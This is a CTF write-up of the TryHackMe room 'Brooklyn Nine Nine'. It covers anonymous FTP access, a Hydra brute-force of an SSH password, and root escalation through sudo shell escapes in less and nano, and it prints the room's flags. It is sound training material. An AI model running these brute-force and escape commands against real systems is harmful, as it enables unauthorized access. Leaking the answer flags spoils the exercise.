#  Brooklyn Nine Nine

> **Platform:** TryHackMe  
> **Difficulty:** Easy  
> **Category:** Web / FTP / SSH Bruteforce / Linux PrivEsc  
> **Date Completed:** 2026-04-18  
> **Room Link:** [https://tryhackme.com/room/brooklynninenine](https://tryhackme.com/room/brooklynninenine)

---

##  Table of Contents

1. [Room Overview](#room-overview)
2. [Reconnaissance](#reconnaissance)
3. [Enumeration](#enumeration)
4. [Exploitation](#exploitation)
5. [Privilege Escalation](#privilege-escalation)
6. [Flags](#flags)
7. [Key Takeaways](#key-takeaways)

---

##  Room Overview

A Brooklyn Nine-Nine themed box with multiple entry paths. The machine exposes an FTP server with anonymous login enabled, a web page with a steganography hint hidden in the source, and weak SSH credentials brute-forceable via Hydra. Once in, two different users (`jake` and `holt`) each have their own `sudo`-based privilege escalation path to root.

**Goal:**  
Capture the user flag and root flag.

**Skills Practiced:**  
Nmap scanning, FTP anonymous login, web source review, steganography hint, SSH brute-forcing with Hydra, Linux sudo privesc via `less` and `nano`.

---

##  Reconnaissance

### Network Scanning

```
nmap -sV -sC 10.49.138.82
```

**Findings:**

| Port | Service | Version / Note |
|------|---------|----------------|
| 21   | FTP     | vsftpd — **Anonymous login enabled** |
| 22   | SSH     | OpenSSH |
| 80   | HTTP    | Apache |

Three services open. Anonymous FTP is the first lead.

---

##  Enumeration

### FTP — Anonymous Login

```
ftp 10.49.138.82
```

```
Username: anonymous
Password: (blank — just press Enter)
```

Once connected, list the files:

```bash
ls
```

A file named `note_to_jake.txt` is present. Download and read it:

```bash
get note_to_jake.txt
exit
cat note_to_jake.txt
```

**Contents:** A note from Amy to Jake telling him his SSH password is far too weak and he needs to change it immediately.

This is a direct hint to brute-force Jake's SSH password.

---

### Web Application

Visiting `http://10.49.138.82/` loads a Brooklyn Nine-Nine themed page with a group photo.

Viewing the page source (`Ctrl+U`) reveals a hidden comment:

```html
<!-- Have you tried steganography? -->
```

Download the background image for investigation:

```bash
wget http://10.49.138.82/brooklyn99.jpg
```

> **Note:** The steganography path is an alternative route. For this writeup we proceeded via SSH brute-force since the FTP note pointed directly at Jake's weak password.

---

##  Exploitation

### Vulnerability

**Type:** Weak SSH credentials + FTP anonymous access exposing internal notes  
**CVE:** N/A  
**Description:**  
Anonymous FTP access leaks an internal note hinting at Jake's weak SSH password. Combining this with a standard wordlist attack via Hydra recovers the credentials.

---

### Steps

**Step 1 — Brute-force Jake's SSH password**

Armed with the username `jake` from the note, run Hydra against SSH:

```bash
hydra -l jake -P /usr/share/wordlists/rockyou.txt ssh://10.49.138.82
```

**Password found: `987654321`**

**Step 2 — Log in as Jake**

```bash
ssh jake@10.49.138.82
```

---

**Step 3 — Find the user flag**

Jake's home directory doesn't hold the flag — check other users:

```bash
ls /home
ls /home/holt
cat /home/holt/user.txt
```

**User flag is in Holt's home directory.**

---

##  Privilege Escalation

Both `jake` and `holt` have separate sudo privesc paths — each can run a different binary as root without a password.

### Check sudo permissions as Jake

```
sudo -l
```

Output:
```
(ALL) NOPASSWD: /usr/bin/less
```

### Check sudo permissions as Holt

```
sudo -l
```

Output:
```
(ALL) NOPASSWD: /bin/nano
```

---

### Path 1 — Privesc via `less` (as Jake)

Using the [GTFOBins `less` technique](https://gtfobins.github.io/gtfobins/less/):

```
sudo less /etc/profile
```

Once inside `less`, drop into a shell by typing:

```
!/bin/sh
```

Root shell obtained. 

### Path 2 — Privesc via `nano` (as Holt)

Using the [GTFOBins `nano` technique](https://gtfobins.github.io/gtfobins/nano/):

```
sudo nano
```

Inside nano, press `Ctrl+R` then `Ctrl+X`, then type:

```
reset; sh 1>&0 2>&0
```

Root shell obtained. 

---

### Get the Root Flag

```bash
cat /root/root.txt
```

---

##  Flags

| Flag | Value |
|------|-------|
| User Flag | `ee11cbb19052e40b07aac0ca060c23ee` |
| Root Flag | `63a9f0ea7bb98050796b649e85481845` |

---

##  Key Takeaways

- **Anonymous FTP is a critical misconfiguration.** Any file accessible via anonymous FTP is world-readable — never store internal notes, credentials, or hints there.
- **Weak passwords fall instantly to rockyou.txt.** `987654321` is one of the most common passwords in the list. Password policies matter.
- **`sudo NOPASSWD` on interactive binaries = instant root.** Both `less` and `nano` allow shell escapes via GTFOBins. Only allow `sudo` on commands that cannot spawn shells.
- **Two privesc paths existed simultaneously.** Always run `sudo -l` on every user account you gain access to — different users can have different misconfigurations.
- **Steganography was a red herring / alternate path.** The `brooklyn99.jpg` source hint is a secondary route worth exploring in full CTF scenarios.

---

##  Tools Used

| Tool | Purpose |
|------|---------|
| Nmap | Port & service scanning |
| FTP client | Anonymous FTP login & file retrieval |
| Browser DevTools / View Source | Discovering steganography hint in page source |
| Wget | Downloading the image for steg analysis |
| Hydra | SSH password brute-force |
| GTFOBins | `less` and `nano` sudo escape techniques |

---

##  References

- [GTFOBins — less](https://gtfobins.github.io/gtfobins/less/)
- [GTFOBins — nano](https://gtfobins.github.io/gtfobins/nano/)
- [HackTricks — Sudo Privesc](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid)
- [Hydra Cheat Sheet](https://github.com/vanhauser-thc/thc-hydra)

---

*Writeup by Avaneesh*
